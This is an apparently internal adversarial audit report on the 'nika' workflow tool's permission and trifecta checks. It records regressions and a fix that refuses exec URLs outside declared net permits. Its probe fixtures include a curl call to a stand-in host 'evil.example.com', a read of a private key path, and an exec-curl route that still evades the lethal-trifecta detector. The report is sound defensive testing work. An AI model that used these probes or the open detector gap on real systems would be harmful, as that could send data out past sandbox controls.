# Audit run DECAY · the verdict/gate domain re-swept (protocol §7a)

> Protocol: `docs/plans/adversarial-audit-protocol.md` §7a. Run 1 =
> `2026-07-28-verdict-coverage.md` (12 reproduced). This is the SAME
> domain, re-swept SYSTEMATICALLY after F11/F13/F15 and this session's
> R2/R3/R4 fixes shipped. It answers the operator's question: **was run 1
> a first-audit harvest (the count falls) or a regenerating class (the
> count holds)?** Never pooled with any other run's count (§1).

## The five declared lines (written before the first probe · unedited after)

```
DOMAIN      run 1's exact domain — the verdict/gate surface: what
            `nika check` and `nika run` claim about a workflow, and
            whether they observe it (one seam: judgment vs observation)
ORACLE      /opt/homebrew/bin/nika (0.106.1 · the pushed tree carrying
            every F-series fix + R2/R3/R4 + this session's arc) · the
            discriminating probes of §0 re-run as the calibration
SURFACES    run 1's own list, verbatim: check verdict lines (TYPES ·
            PERMITS · COST · SECRETS · TRIFECTA) · run settle + reporting
            · the fs/net permit seams · the surfaces that judge for an
            author (hooks · --infer-permits) — re-probed as the
            REGRESSION battery (each F-series predicate re-run) then
            swept for NEW findings of the same classes (the decay count)
DENOMINATOR solo session · 12 regression re-probes + 8 new probes planned
            (declared up front) · ~3h
EXCLUDED    the domains already swept since run 1 — trace/attestation ·
            composition/budget · agent-loop/MCP pricing · secrets flow —
            never pooled (§1) · the unrecovered rows F9/F10 (attested-
            only by protocol, §6.5) · #5's never-audited surfaces
            (a different run, a different count)
```

**The caveat the protocol requires in this header (§7a), stated before
measuring:** run 1 was REACTIVE (it went where the day's reports
pointed); this run is SYSTEMATIC (the same surfaces enumerated and
probed). A systematic sweep finds more per hour than a reactive one, so
a **flat** count between them is evidence of DECAY, not stasis — and a
falling count understates the closure.

## §0 · Calibration (run 1's own oracle probe, re-run)

The F11 discriminator, on today's oracle:

```
permits.fs.read: ["data/*"] · invoke nika:read data/sub/deeper/private.key
  rc=2 · ✖ PERMITS [NIKA-SEC-004 · fs] task `peek` · path is outside
         permits.fs.read · fix: add "data/sub/deeper/private.key" to it
```

The narrow-glob fail-open is closed, with the exact machine fix on the
line. (The protocol's own calibration probe, re-run verbatim.)

## Regression battery (each F-series predicate re-run · closed | regression)

| Row | Predicate (run 1's own) | Verdict | Proof |
|---|---|---|---|
| F11 · fs narrow glob fail-open | `data/*` vs deeper path | **CLOSED** | NIKA-SEC-004 + exact fix on the line (§0) |
| F8 · permit const-resolution | `fs.read: ["${{ const.d }}/**"]` | **CLOSED by law** | refused loudly: `NIKA-AUTH-007 · permit bound is interpolated, not literal · fix: write the literal` — the wall is literal-only, normatively (NEP-0004 law 1) |
| F13 · ANY-host decidable | notify target=secret, no net.http | **CLOSED** | NIKA-SEC-004 · "reaches a host computed at run time, and permits.net.http grants none — the run is refused whatever the value turns out to be · fix: add the host (egress: sanctions the FLOW, permits.net.http grants the CAPABILITY)" |
| F1 · structured swallows failure | `capture: structured` on /usr/bin/false | **CLOSED (documented contract)** | spec 02 §189-192: `capture: structured` = `{stdout, stderr, exit_code}` — the status IS data, deliberately, the exception to fail-the-task |
| F7 · cost 328× | fetch 3.2MB → summarise | **CLOSED by narrowing** | `✔ COST $0.0050 – $0.0050 worst-case OUTPUT ceiling · prompts, exec + mcp unpriced` — the gap is named on the line |
| F15 · check vs infer-permits | const-bearing path | **CLOSED** | infer offers `read: ["./data/x.txt"]`; check names the same path as the required fix — one resolved identity, zero contradiction |
| F5 · summary misattribution | two failed execs | **CLOSED** | both errors carried, task-named, causal order (`first` then `second`) |
| **F2 · SEC-009 perverse incentive** | native fetch→write→exec-read vs exec curl | **REGRESSION (still open · P0)** | native shape: `NIKA-SEC-009 lethal trifecta complete` fires · identical exec-curl shape: `✔ TRIFECTA no lethal trifecta` — the escape is live today (exec ingress never born_ingress, content_flow.rs:140 unchanged) |
| **F3 · TYPES vacuity** | `.total_usd` from `nika:inspect view: cost` (shapeless output) | **REGRESSION (still open · P0)** | `✔ TYPES deep references fit the shapes tasks declare · builtin output has none` — the ref passes check and dies at run (builtin output has no declared shape; nothing to fit against) |
| **F4 · --answer headless** | `run --answer confirm=true` (no --resume) | **REGRESSION (still open · P1)** | still refused: `--resume <TRACE>` required — the CI one-pass gate is unusable headless |
| **F14 · edit hook** | `NIKA="${NIKA_BIN:-nika}"` | **REGRESSION (still present)** | the hook still judges with a possibly-stale PATH binary (`check-on-edit.sh:55`) |
| F6 · banner repeats | iTerm re-render | carried: reported-never-reproduced | — |
| F9/F10 | unrecovered | carried: attested-only (protocol §6.5) | — |
| OPEN · trifecta over-approx | leg ③ witness selection | carried: open question (operator's) | — |

## New findings (the decay count — same domain, new spots)

| ID | Class | Sev | State | Seam | One line |
|---|---|---|---|---|---|
| **D1** | **false-green** | **P0** | **fixed this run** | `nika-check/src/permits_fit.rs` — the exec net-fit lane did not exist | `exec: ["curl", "https://evil.example.com/x"]` outside `permits.net.http` passed check clean (rc=0); the run refused only at the OS sandbox (curl error 6 · `NIKA-EXEC-001`). The argv URL is a LITERAL — statically decidable, was unmodeled. check-green, run-refused → now refused AT CHECK with the machine fix (see « The repair ») |

D2 probe (a secret in `outputs:`) returned the honest verdict
(`NIKA-SEC-007 · EGRESS via outputs.token`) — not a finding.

## The curve verdict (§7a)

```
run 1 (reactive)        12 reproduced defects in this domain
run DECAY (systematic)   4 recurring (F2 · F3 · F4 · F14)
                       + 1 new (D1, false-green P0 — fixed this run)
                       
7 of 12 verified CLOSED on today's oracle — each with its discriminating
probe re-run green (F11 · F8-law · F13 · F1-contract · F7-narrowing ·
F15-parity · F5-causal-order).
```

**The total falls — the severity histogram does not.** By the protocol's
own caveat (a systematic sweep finds more per hour, so flat = decay), a
fall to ~40 % says the class IS being shed. But the recurring mass sits
entirely in the **false-green/fail-open family**: F2's trifecta escape
(P0), F3's shapeless-output pass (P0) — and the sweep itself turned up
D1, a brand-new false-green P0 **in the same family**, so the class is
not exhausted. It died inside its own run (every session finding has),
which is the sweep working; what remains open is not sweep work. The
plain fail-closed and teaching classes are closed; **the class that
regenerates is the verdict that claims more than it covers at the
fs/net/judgment seams** — and its two standing P0s (F2 · F3) are both
modeling decisions, named below as the operator's, not the sweep's.
That is the answer the curve gives today, and it points at the seams,
not the sweep.

## The repair (shipped this run)

**D1 — the exec net-fit lane** (`crates/nika-check/src/permits_fit.rs` ·
`check_exec_net`, called at the end of `check_exec`): an exec whose argv
(or shell line) carries a LITERAL `http(s)://` token now judges that
host exactly like an invoke's — outside `permits.net.http` it is a
`net` escape with the `add "<host>" to permits.net.http` machine fix;
inside it is clean. A floor-blocked host (loopback/private/…) keeps the
SSRF floor's single voice — the exec arm never double-reports it. Where
the form itself is already refused (a shell line under a program
allowlist · NIKA-SEC-004-by-form) the net question is moot and the arm
does not run; an admissible shell line is scanned for standalone URL
tokens only — a conservative read that can miss obfuscation (pipes,
variables) but never falsely refuses; the runtime sandbox owns
everything deeper (declared).

Pinned by `an_exec_url_judges_its_host_like_an_invoke` (4 legs: granted
clean · withheld escapes with the exact fix · admissible shell line
judged · floor host single-voice) — 565 nika-check lib tests green.

Live, on this run's own fixture (`engine/target/audit5/new1.nika.yaml`):

```
before  ✔ PERMITS …  rc=0   (the false-green — died at the sandbox)
after   ✖ PERMITS [NIKA-SEC-004 · net] task `leak` · exec URL host
        `evil.example.com` is outside permits.net.http
        · fix: add "evil.example.com" to permits.net.http   rc=2
granted (host declared)  ✔ PERMITS  rc=0   (no false refusal)
```

**The coherence tail the fix owed (same commit arc):** the new lane
introduced an F15-class contradiction on its first day — follow the
`add` fix and NIKA-DRIFT-001 answered « remove the entry » (the drift
pass did not count exec argv URLs as net uses). Closed in
`crates/nika-dap/src/drift.rs`: an argv's literal `http(s)://` tokens
now feed the same host set the invoke effects feed, a dynamic or
leading-template token poisons it, and a shell line stays opaque (no
provable completeness — the pass's own law). Pinned by
`an_exec_argv_url_counts_as_a_net_use` +
`a_shell_exec_or_dynamic_token_suppresses_net_entry_flags`; the three
`native-strict` fixtures in `nika-cli` (whose `exec: ["curl", …,
"https://acme.test"]` shape was the finding's exact class) now declare
their `net.http` — they test the hint gate, not the escape. Verified
live both ways: granted → `✔ PERMITS` with NO drift hint · withheld →
the escape with NO contradictory remove-advice.

## Probe log (verbatim outputs · each claim MEASURED, §4)

(verbatim excerpts inline per row above — full fixtures + logs under
`engine/target/audit5/` (scratch, re-creatable from this file's rows).)

## Follow-on (named, not hidden)

- F2's escape asks a modeling decision (is exec ingress untrusted?) —
  **operator's call, not a sweep's** (the current law is documented at
  content_flow.rs:140; changing it changes every exec workflow's
  trifecta posture).
- F3's class asks for builtin output shapes (the stdlib's `returns:`
  surface) — architectural, named.
- F4's `--answer` on a first run is a small, bounded UX fix, named.
